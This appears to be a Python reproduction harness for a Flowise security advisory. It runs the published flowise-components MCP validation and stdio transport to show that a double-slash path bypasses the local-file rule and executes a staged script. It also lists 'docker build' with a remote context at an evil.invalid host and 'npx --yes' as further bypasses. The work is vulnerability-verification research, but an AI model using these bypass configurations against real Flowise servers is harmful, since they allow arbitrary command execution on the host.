"""Mechanism reproduction for flowise/GHSA-M99R-2HXC-CP3Q.

The PoC loads the *pinned published* ``flowise-components`` build for the variant
under test and drives the real upstream call chain:

    validateMCPServerConfig(serverParams)          # the only security gate
      -> new MCPToolkit(serverParams, 'stdio')     # same module, no re-implementation
      -> toolkit.initialize()                      # opens StdioClientTransport
      -> StdioClientTransport(params)              # spawn(command, args) on the host

Nothing about the whitelist, the argument checks or the transport is rewritten
here.  The fixture config supplies ``{"command": "node", "args": ["//…"]}`` (the
double-slash spelling comes from ``PAYLOAD_PATH``); on the vulnerable build the
``/^\\/[^/]/`` absolute-path rule does not match it, so the config reaches the
transport and the pre-staged JavaScript is executed by a real child process.  On
the patched build the same config is rejected before any transport is created.

Scenario ``attack`` asserts the bypass and the spawned-child effect.  Scenario
``benign`` drives the same upstream code with a legitimate relative-path MCP
stdio server and asserts a real MCP handshake and tool round trip.
"""

from __future__ import annotations

import json
import os
from pathlib import Path
import shutil
import subprocess
import sys

from lab_support import parser, read_context, record

FIXTURES = Path("/lab/fixtures")
# The compiled build of the published package, installed into the image by the
# build stage; it contains the real validation functions and MCPToolkit.
PACKAGE_ENTRY = Path("/lab/mcp/node_modules/flowise-components/dist/nodes/tools/MCP/core.js")
PAYLOAD_PATH = "//lab/fixtures/mcp_payload.js"
PLACEHOLDER = "__MCP_PAYLOAD_PATH__"
HARNESS = "ghsa_mcp_harness.js"
RESOLVED_CONFIG = "resolved_mcp_config.json"
HARNESS_RESULT = "harness_result.json"
CHILD_EFFECT = ".ghsa-mcp-child-effect.txt"
NODE_TIMEOUT = 120

# Candidate configs that the advisory documents as bypasses of the same gate.
# ``rce`` is the offline end-to-end carrier; the other two are tracked as
# pure-function assertions because they need network or a docker daemon.
BYPASS_CASES = (
    {
        "id": "rce_local_file_via_double_slash",
        "command": "node",
        "args": ["//lab/fixtures/mcp_payload.js"],
        "note": "double-slash absolute path escapes the local-file-access rule",
    },
    {
        "id": "docker_build_remote_context",
        "command": "docker",
        "args": ["build", "https://evil.invalid/"],
        "note": "docker subcommand allowlist does not cover build",
    },
    {
        "id": "npx_yes_remote_package",
        "command": "npx",
        "args": ["--yes", "ghsa-mcp-nonexistent-package"],
        "note": "npx flag denylist misses the --yes long form",
    },
)

HARNESS_SOURCE = r"""'use strict'
// Drives the pinned upstream flowise-components build. The only control flow
// added here is error reporting and the pure-function bypass assertions.
const fs = require('fs')
const path = require('path')

const options = JSON.parse(process.argv[2])
const core = require(path.resolve(options.entry))

function rejection(work) {
  try {
    work()
    return null
  } catch (error) {
    return String((error && error.message) || error)
  }
}

async function main() {
  const result = {
    validation: 'not_run',
    validation_error: null,
    negative_control: 'not_run',
    negative_control_error: null,
    toolkit_error: null,
    tools: null,
    tool_call_result: null,
    bypass_assertions: [],
  }

  // The gate itself: an exception means the config was rejected.
  result.validation_error = rejection(() => core.validateMCPServerConfig(options.config))
  result.validation = result.validation_error === null ? 'accepted' : 'rejected'

  // Negative control: the same gate must reject a normal absolute path, which
  // proves the checks run and that only the double-slash spelling escapes.
  result.negative_control_error = rejection(() =>
    core.validateArgsForLocalFileAccess(['/etc/passwd']))
  result.negative_control =
    result.negative_control_error === null ? 'accepted' : 'rejected'

  // Pure-function assertions for the other two bypasses named by the advisory.
  for (const item of options.bypass_cases || []) {
    const error = rejection(() =>
      core.validateMCPServerConfig({ command: item.command, args: item.args }))
    result.bypass_assertions.push({
      id: item.id,
      command: item.command,
      args: item.args,
      allowed: error === null,
      error,
    })
  }

  if (result.validation === 'accepted' && options.drive_toolkit) {
    try {
      const toolkit = new core.MCPToolkit(options.config, 'stdio')
      await toolkit.initialize()
      result.tools = toolkit.tools.map((tool) => tool.name)
      if (options.tool_name && toolkit.tools.length) {
        const tool = toolkit.tools.find((item) => item.name === options.tool_name)
        if (tool) {
          result.tool_call_result = await tool.invoke({ text: options.tool_text })
        }
      }
    } catch (error) {
      result.toolkit_error = String((error && error.message) || error)
    }
  }

  fs.writeFileSync(options.result, JSON.stringify(result, null, 2) + '\n')
  process.stdout.write(JSON.stringify(result) + '\n')
}

main().then(
  () => process.exit(0),
  (error) => {
    process.stderr.write('harness failed: ' + String((error && error.stack) || error) + '\n')
    process.exit(1)
  }
)
"""


def _fixture_config(scenario: str) -> dict:
    name = "attack_config.json" if scenario == "attack" else "benign_config.json"
    return json.loads((FIXTURES / name).read_text(encoding="utf-8"))


def _resolve_config(config: dict, scenario: str) -> dict:
    """Bind the fixture config to the payload this environment stages.

    The fixture carries ``__MCP_PAYLOAD_PATH__`` where the attacker's absolute
    path goes.  On the attack scenario it becomes a double-slash path, which is
    the whole bypass; the benign scenario keeps a legitimate relative path to
    the MCP stdio server.  No other field is touched.
    """
    target = PAYLOAD_PATH if scenario == "attack" else "mcp_server.js"
    resolved = dict(config)
    args = [target if arg == PLACEHOLDER else arg for arg in (resolved.get("args") or [])]
    resolved["args"] = args
    return resolved


def _run_node(workdir: Path, options: dict) -> tuple[int, str, str]:
    environment = dict(os.environ)
    harness = workdir / HARNESS
    harness.write_text(HARNESS_SOURCE, encoding="utf-8")
    try:
        completed = subprocess.run(
            ["node", str(harness), json.dumps(options)],
            cwd=str(workdir),
            env=environment,
            capture_output=True,
            text=True,
            timeout=NODE_TIMEOUT,
        )
    except FileNotFoundError:
        return 127, "", "node executable not found in the image"
    except subprocess.TimeoutExpired as error:
        return 124, (error.stdout or ""), "node harness timed out"
    return completed.returncode, completed.stdout, completed.stderr


def _diagnostic(returncode: int, stdout: str, stderr: str) -> str:
    lines = [
        "returncode: %d" % returncode,
        "--- harness stdout ---",
        stdout.rstrip("\n"),
        "--- harness stderr ---",
        stderr.rstrip("\n"),
    ]
    return "\n".join(lines) + "\n"


def main() -> int:
    args = parser(__doc__).parse_args()
    context = read_context(args.context)
    scenario = context["scenario"]
    output = Path(args.output)
    output.mkdir(parents=True, exist_ok=True)

    fixture_config = _fixture_config(scenario)
    config = _resolve_config(fixture_config, scenario)
    (output / RESOLVED_CONFIG).write_text(
        json.dumps(config, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    # The benign task resolves the server by a relative path, so it is staged
    # next to the working directory that the stdio child inherits.
    if scenario == "benign":
        shutil.copyfile(FIXTURES / "mcp_server.js", output / "mcp_server.js")

    options = {
        "entry": str(PACKAGE_ENTRY),
        "config": config,
        "result": str(output / HARNESS_RESULT),
        "drive_toolkit": True,
        "bypass_cases": [dict(item) for item in BYPASS_CASES],
        "tool_name": "ghsa_echo" if scenario == "benign" else None,
        "tool_text": "ghsa-benign-round-trip" if scenario == "benign" else None,
    }
    returncode, stdout, stderr = _run_node(output, options)
    (output / "harness_stdout.txt").write_text(
        _diagnostic(returncode, stdout, stderr), encoding="utf-8")

    harness_result = None
    result_path = output / HARNESS_RESULT
    if result_path.is_file():
        try:
            harness_result = json.loads(result_path.read_text(encoding="utf-8"))
        except json.JSONDecodeError:
            harness_result = None

    child_effect_path = output / CHILD_EFFECT
    child_effect = child_effect_path.read_text(encoding="utf-8") if child_effect_path.is_file() else None

    if harness_result is None:
        observation = {
            "target_ready": False,
            "execution_status": "failed",
            "scenario": scenario,
            "variant": context["variant"],
            "package_entry": str(PACKAGE_ENTRY),
            "package_entry_present": PACKAGE_ENTRY.is_file(),
            "node_returncode": returncode,
            "error": "pinned upstream module was not driven to completion",
        }
        return record(context, args.output, observation, {
            RESOLVED_CONFIG: json.dumps(config, ensure_ascii=False, indent=2) + "\n",
            "harness_stdout.txt": (output / "harness_stdout.txt").read_text(encoding="utf-8"),
        })

    observed = {
        "target_ready": True,
        "execution_status": "completed",
        "scenario": scenario,
        "variant": context["variant"],
        "package_entry": str(PACKAGE_ENTRY),
        "package_entry_present": True,
        "node_returncode": returncode,
        "config_source": "fixtures/%s" % (
            "attack_config.json" if scenario == "attack" else "benign_config.json"),
        "resolved_command": config.get("command"),
        "resolved_args": list(config.get("args") or []),
        "validation": harness_result.get("validation"),
        "validation_error": harness_result.get("validation_error"),
        "negative_control": harness_result.get("negative_control"),
        "negative_control_error": harness_result.get("negative_control_error"),
        "toolkit_error": harness_result.get("toolkit_error"),
        "tools": harness_result.get("tools"),
        "tool_call_result": harness_result.get("tool_call_result"),
        "bypass_assertions": harness_result.get("bypass_assertions"),
        "child_process_executed": child_effect is not None,
        "child_effect": child_effect,
    }
    if scenario == "attack" and child_effect is not None:
        observed["observation_note"] = (
            "the MCP stdio transport spawned a real node child process and the "
            "pre-staged JavaScript wrote this marker")
    if scenario == "benign":
        round_trip = harness_result.get("tool_call_result")
        observed["benign_task_ok"] = bool(
            harness_result.get("tools")
            and round_trip
            and "ghsa-benign-round-trip" in str(round_trip)
            and child_effect is None)
    effects = {
        RESOLVED_CONFIG: json.dumps(config, ensure_ascii=False, indent=2) + "\n",
        HARNESS_RESULT: json.dumps(harness_result, ensure_ascii=False, indent=2) + "\n",
        "harness_stdout.txt": (output / "harness_stdout.txt").read_text(encoding="utf-8"),
    }
    if scenario == "benign":
        effects["benign_mcp_server.js"] = (output / "mcp_server.js").read_text(encoding="utf-8")
    if child_effect is not None:
        effects[CHILD_EFFECT] = child_effect
    return record(context, args.output, observed, effects)


if __name__ == "__main__":
    raise SystemExit(main())
